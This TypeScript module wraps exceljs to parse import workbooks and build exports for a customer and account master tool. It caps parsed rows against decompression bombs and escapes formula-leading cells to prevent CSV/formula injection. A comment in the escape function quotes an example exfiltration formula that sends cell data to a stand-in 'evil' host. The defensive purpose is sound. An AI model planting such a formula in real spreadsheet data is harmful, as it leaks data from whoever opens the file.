/**
 * Thin wrappers around exceljs for parsing import workbooks.
 * Used by the Steward import pages for both Customer and Account masters.
 *
 * PERF (audit #27): exceljs is ~1.1MB of JS (plus jszip/saxes) that was
 * statically imported into the shared server chunk — every cold start paid its
 * parse+eval even for pages that never touch a workbook. The type-only import
 * is erased at compile time; the runtime module loads on first actual use.
 */
import type ExcelJSNS from 'exceljs';

let excelJsPromise: Promise<typeof ExcelJSNS> | null = null;
function loadExcelJS(): Promise<typeof ExcelJSNS> {
  excelJsPromise ??= import('exceljs').then((m) => (m as { default?: typeof ExcelJSNS }).default ?? (m as unknown as typeof ExcelJSNS));
  return excelJsPromise;
}

// Defence-in-depth against a decompression-bomb / oversized workbook: the 5 MB
// upload cap bounds only the COMPRESSED bytes, but a crafted .xlsx inflates to
// far more rows. Cap total parsed data rows so the per-row DB loops downstream
// (import promote) cannot be driven into a multi-hundred-thousand-query DoS.
// The real master is ~3,300 customers, so 50k is comfortable headroom.
const MAX_TOTAL_ROWS = 50_000;

export type ParsedRow = Record<string, string | number | null>;

export type ParsedSheet = {
  name: string;
  headers: string[];
  rows: ParsedRow[];
};

export async function parseWorkbook(buffer: ArrayBuffer | Uint8Array): Promise<ParsedSheet[]> {
  const ExcelJS = await loadExcelJS();
  const wb = new ExcelJS.Workbook();
  // exceljs accepts a Uint8Array; ts-strict typing on Buffer is over-narrow here.
  const u8 = buffer instanceof Uint8Array ? buffer : new Uint8Array(buffer);
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  await wb.xlsx.load(u8 as any);
  const sheets: ParsedSheet[] = [];
  let totalRows = 0;
  wb.eachSheet((ws) => {
    const headers: string[] = [];
    ws.getRow(1).eachCell({ includeEmpty: false }, (cell) => {
      headers.push(String(cell.value ?? '').trim());
    });
    const rows: ParsedRow[] = [];
    ws.eachRow({ includeEmpty: false }, (row, rowNum) => {
      if (rowNum === 1) return;
      const obj: ParsedRow = {};
      headers.forEach((h, i) => {
        const v = row.getCell(i + 1).value;
        if (v == null || v === '') {
          obj[h] = null;
        } else if (typeof v === 'number' || typeof v === 'string') {
          obj[h] = v;
        } else if (v instanceof Date) {
          obj[h] = v.toISOString();
        } else if (typeof v === 'object' && 'richText' in (v as object)) {
          // F-10: handle rich-text runs (mixed scripts like
          // `Lulu هايبر` produce {richText: [{text:'Lulu'},{text:'هايبر'}]}).
          // Previous code took only the first run and silently dropped the rest.
          const rt = (v as { richText: { text: string }[] }).richText;
          obj[h] = rt.map((r) => r.text).join('');
        } else if (typeof v === 'object' && 'error' in (v as object)) {
          // F-10: cell evaluates to an Excel error (#N/A / #REF! / #VALUE!)
          // — surface it explicitly so the row gets quarantined with a
          // useful message instead of `[object Object]`.
          obj[h] = `#ERROR:${(v as { error: string }).error}`;
        } else if (typeof v === 'object' && 'text' in (v as object)) {
          obj[h] = String((v as { text: string }).text);
        } else if (typeof v === 'object' && 'result' in (v as object)) {
          const r = (v as { result: unknown }).result;
          // F-10: a formula whose `result` is itself an Excel error.
          if (r && typeof r === 'object' && 'error' in (r as object)) {
            obj[h] = `#ERROR:${(r as { error: string }).error}`;
          } else {
            obj[h] = String(r ?? '');
          }
        } else {
          obj[h] = String(v);
        }
      });
      rows.push(obj);
    });
    totalRows += rows.length;
    if (totalRows > MAX_TOTAL_ROWS) {
      throw new Error(
        `Workbook has too many rows (>${MAX_TOTAL_ROWS.toLocaleString()}). Split the file into smaller batches.`
      );
    }
    sheets.push({ name: ws.name, headers, rows });
  });
  return sheets;
}

/**
 * QA-021: prefix-escape any cell value that starts with `=`, `+`, `-`, `@`,
 * `<TAB>`, or `\r`. Excel/LibreOffice/Numbers all interpret these as formulas
 * by default — without escaping, an attacker-controlled customer name like
 * `=HYPERLINK("http://evil/?x=" & A1)` exfiltrates data when the steward opens
 * the export.
 *
 * The leading single quote is the documented Excel formula-disable marker. It
 * remains visible in the cell but is dropped on copy-paste.
 */
function escapeFormulaCell(v: unknown): unknown {
  if (typeof v !== 'string') return v;
  if (/^[=+\-@\t\r]/.test(v)) return `'${v}`;
  return v;
}

export async function buildWorkbook(rows: Record<string, unknown>[], sheetName = 'Sheet1') {
  const ExcelJS = await loadExcelJS();
  const wb = new ExcelJS.Workbook();
  const ws = wb.addWorksheet(sheetName);
  if (rows.length === 0) return wb;
  const headers = Array.from(
    rows.reduce<Set<string>>((set, r) => {
      Object.keys(r).forEach((k) => set.add(k));
      return set;
    }, new Set())
  );
  ws.columns = headers.map((h) => ({ header: h, key: h, width: Math.max(12, h.length + 2) }));
  for (const r of rows) {
    const safe: Record<string, unknown> = {};
    for (const k of headers) safe[k] = escapeFormulaCell(r[k]);
    ws.addRow(safe);
  }
  ws.getRow(1).font = { bold: true };
  return wb;
}
